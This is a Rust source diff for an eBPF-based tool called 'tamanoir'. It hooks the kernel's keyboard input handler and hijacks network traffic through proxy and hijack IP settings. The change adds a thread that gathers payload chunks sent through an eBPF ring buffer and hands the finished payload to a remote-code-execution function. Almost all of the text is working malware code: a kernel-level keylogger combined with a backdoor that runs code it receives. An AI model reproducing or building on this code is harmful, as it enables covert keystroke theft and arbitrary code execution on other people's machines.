@@ -1,4 +1,4 @@
-use std::net::Ipv4Addr;
+use std::{net::Ipv4Addr, os::fd::AsRawFd, str::FromStr, thread, time::Duration};
 
 use aya::{
     programs::{tc, KProbe, SchedClassifier, TcAttachType},
@@ -6,6 +6,9 @@ use aya::{
 };
 use clap::Parser;
 use log::{debug, warn};
+use mio::{unix::SourceFd, Events, Interest, Poll, Token};
+use tamanoir::{rce::execute, ringbuf::RingBuffer};
+use tamanoir_common::{ContinuationByte, RceEvent, TargetArch};
 use tokio::signal;
 
 #[derive(Debug, Parser)]
@@ -18,9 +21,6 @@ struct Opt {
 
     #[clap(long, required = true)]
     hijack_ip: Ipv4Addr,
-
-    #[clap(long, default_value_t = 0)]
-    layout: u8,
 }
 
 #[tokio::main]
@@ -31,7 +31,6 @@ async fn main() -> anyhow::Result<()> {
         iface,
         proxy_ip,
         hijack_ip,
-        layout,
     } = Opt::parse();
 
     let rlim = libc::rlimit {
@@ -46,10 +45,11 @@ async fn main() -> anyhow::Result<()> {
     let proxy_ip = proxy_ip.to_bits();
     let hijack_ip = hijack_ip.to_bits();
 
+    let arch = TargetArch::from_str(std::env::consts::ARCH).unwrap() as u8;
     let mut ebpf = EbpfLoader::new()
         .set_global("TARGET_IP", &proxy_ip, true)
         .set_global("HIJACK_IP", &hijack_ip, true)
-        .set_global("KEYBOARD_LAYOUT", &layout, true)
+        .set_global("ARCH", &arch, true)
         .load(aya::include_bytes_aligned!(
             "../../target/bpfel-unknown-none/release/tamanoir"
         ))?;
@@ -76,6 +76,57 @@ async fn main() -> anyhow::Result<()> {
     program.load()?;
     program.attach("input_handle_event", 0)?;
 
+    thread::spawn({
+        move || {
+            let mut poll = Poll::new().unwrap();
+            let mut events = Events::with_capacity(128);
+            let mut ring_buf = RingBuffer::new(&mut ebpf);
+            let mut payload: Vec<u8> = vec![];
+
+            poll.registry()
+                .register(
+                    &mut SourceFd(&ring_buf.buffer.as_raw_fd()),
+                    Token(0),
+                    Interest::READABLE,
+                )
+                .unwrap();
+            loop {
+                poll.poll(&mut events, Some(Duration::from_millis(100)))
+                    .unwrap();
+
+                for event in &events {
+                    if event.token() == Token(0) && event.is_readable() {
+                        while let Some(item) = ring_buf._next() {
+                            let rce: [u8; RceEvent::LEN] = item.to_owned().try_into().unwrap();
+                            let rce = rce.as_ptr() as *const RceEvent;
+                            let rce = unsafe { *rce };
+                            if rce.is_first_batch {
+                                debug!("payload batch transmission start");
+                                if let ContinuationByte::Reset | ContinuationByte::ResetEnd =
+                                    rce.event_type
+                                {
+                                    debug!("clear payload");
+                                    payload.clear()
+                                }
+                            }
+
+                            payload.extend_from_slice(rce.payload());
+                            debug!("transmitted payload is now {} bytes long ", payload.len());
+                            if rce.is_last_batch {
+                                debug!("payload batch transmission is finished!");
+                                if let ContinuationByte::End | ContinuationByte::ResetEnd =
+                                    rce.event_type
+                                {
+                                    debug!("payload full transmission is finished, sending it to executor");
+                                    let _ = execute(&payload);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    });
     let ctrl_c = signal::ctrl_c();
     println!("Waiting for Ctrl-C...");
     ctrl_c.await?;
